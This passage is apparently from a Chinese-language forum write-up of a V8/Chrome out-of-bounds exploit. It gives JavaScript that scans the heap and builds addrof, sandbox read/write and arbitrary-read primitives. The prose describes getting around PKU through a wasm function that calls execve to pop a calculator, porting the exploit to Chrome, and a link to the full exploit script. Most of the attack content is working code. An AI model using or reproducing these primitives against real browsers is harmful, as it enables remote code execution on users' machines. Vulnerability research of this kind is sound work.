
```javascript
let target_arr = [1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];
let ref_arr = make_ref(target_arr);
let ab = new ArrayBuffer(0x100);
let ref_ab = make_ref(ab);
let dv = new DataView(ab);
let obj_arr = [{},{}];
let target_idx = -1;

for (let i = 0; i < 0x10000000; i++){
  // logg("oob_arr[i]",f64_to_u64(oob_arr[i]));
  if (((oob_arr[i]) == 1.1) &&
      ((oob_arr[i+1]) == 2.2) &&
      ((oob_arr[i+2]) == 3.3) &&
      ((oob_arr[i+3]) == 4.4) &&
      ((oob_arr[i+4]) == 5.5)){
    target_idx = i;
    logg("target_idx",target_idx);
    break;
  }
}

if (target_idx == -1){
  console.log("[x] Failed to find target_idx!");
  return;
}

// p(target_arr);
// p(obj_arr);
let target_arr_element_addr = oob_arr_element_addr + (target_idx) * 8;
let elements_confused_idx = target_idx + 0x50/8;

let obj_arr_idx_offset = 0x21;
let obj_arr_element_addr = target_arr_element_addr + (obj_arr_idx_offset) * 8;
logg("target_arr_element_addr",target_arr_element_addr);
logg("obj_arr_element_addr",obj_arr_element_addr);

function cage_read(addr){
  addr = Number(addr);
  if (addr & 1){
    addr -= 1;
  }

  addr -= 7;
  let org = f64_to_u64(oob_arr[elements_confused_idx]);
  oob_arr[elements_confused_idx] = lh_u32_to_f64(addr, Number(org >> 32n));
  let val = f64_to_u64(target_arr[0]);
  oob_arr[elements_confused_idx] = u64_to_f64(org);
  return val;
}

function cage_write(addr,val){
  addr = Number(addr);
  if (addr & 1){
    addr -= 1;
  }
  addr -= 7;
  logg("addr",addr);
  let org = f64_to_u64(oob_arr[elements_confused_idx]);
  oob_arr[elements_confused_idx] = lh_u32_to_f64(addr, Number(org >> 32n));
  let org_val = f64_to_u64(target_arr[0]);

  // target_arr[0] = lh_u32_to_f64(val, Number(org_val >> 32n));
  target_arr[0] = u64_to_f64(val);
  oob_arr[elements_confused_idx] = u64_to_f64(org);
}

function addrof(obj){
  obj_arr[0] = obj;
  let ret = cage_read(obj_arr_element_addr);
  // logg("ret",ret);
  // stop();
  return u64_to_u32_lo(ret);
}

function AAR(addr){
  cage_write(ab_addr+0x24n,addr);
  let ret = dv.getBigUint64(0,true);
  // logg("ret",ret);
  return ret;
}
```

由于此时布局的稳定性还算不错，后续申请的几个对象与`target_arr`之间的距离是固定的，所以能否准确定位到`target_arr`是很重要的，他直接影响了后续的原语构造

所以我采用了扫描匹配 `target_arr` 内容的方式，匹配到`target_arr`之后，我们可以`gdb`调试，字节计算出 `target_arr` 对象本身以及后续 `obj_arr` 等对象的精确偏移，利用这个偏移，我们通过 `oob_arr` 修改后续对象的内容，从而实现利用原语的构造。

```javascript
for (let i = 0; i < 0x10000000; i++){
  // logg("oob_arr[i]",f64_to_u64(oob_arr[i]));
  if (((oob_arr[i]) == 1.1) &&
      ((oob_arr[i+1]) == 2.2) &&
      ((oob_arr[i+2]) == 3.3) &&
      ((oob_arr[i+3]) == 4.4) &&
      ((oob_arr[i+4]) == 5.5)){
    target_idx = i;
    logg("target_idx",target_idx);
    break;
  }
}
```

## step5

这里需要单独讨论一下如何弹出计算器。

当时现场机器cpu是intel14 gen，在linux平台上有一个pku保护，所以我当时在执行shellcode的时候挂了。解决也很简单，使用jit spray或者wasm函数，我这里为了更加稳定使用了wasm函数。wasm中定义了一些汇编，然后通过传入两个`i64`的值，来执行`execve`，然后我每次只需要修改稳定`cmd_ptr`即可

![](https://bbs.kanxue.com/upload/attach/202602/971428_G8YRKGEPQ7K7K74.png)

接着需要解释为什么执行这样命令，这个lll是我自己使用的机器，我使用了vnc。最重要的步骤是`export XAUTHORITY=/home/lll/.Xauthority`，这个可以避免环境问题导致的 X11 认证失败，后面跟着的`export DISPLAY=:100;`是我自己vnc开放的端口，自己的机器只用了`d8`，没放到chrome里

![](https://bbs.kanxue.com/upload/attach/202602/971428_WZMHG9Q88RNHSBT.png)

对于下发的虚拟机，采用了动态查找授权文件的方式，后续的步骤和之前一样

![](https://bbs.kanxue.com/upload/attach/202602/971428_U4S7ARAC2HJDMZE.png)

移植到chrome里主要需要解决的问题是遍历`oob_arr`的问题，我这里起始地址设置到了`0x1a0000`，最后就可以弹出计算器了

![](https://bbs.kanxue.com/upload/attach/202602/971428_4FX8DKQASHTMFZ5.png)

# exploit

完整的利用脚本，全部代码位于这里[c3aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6X3x3h3I4&6P5i4W2Q4x3V1k6h3z5q4)9J5k6p5g2^5M7r3I4G2K9i4c8Q4x3X3c8o6L8$3I4D9k6h3y4@1K9h3!0F1i4K6u0r3N6s2u0W2k6g2)9J5c8X3#2S2K9h3&6Q4x3V1k6I4N6$3u0Q4y4h3k6K6z5g2)9#2k6X3k6A6L8X3q4D9i4K6g2X3L8h3!0F1L8%4c8A6L8Y4b7](<https://bbs.kanxue.com/elink@4ecK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6X3x3h3I4&6P5i4W2Q4x3V1k6h3z5q4)9J5k6p5g2^5M7r3I4G2K9i4c8Q4x3X3c8o6L8$3I4D9k6h3y4@1K9h3!0F1i4K6u0r3N6s2u0W2k6g2)9J5c8X3#2S2K9h3&6Q4x3V1k6I4N6$3u0Q4y4h3k6K6z5g2)9#2k6X3k6A6L8X3q4D9i4K6g2X3L8h3!0F1L8%4c8A6L8Y4b7>).
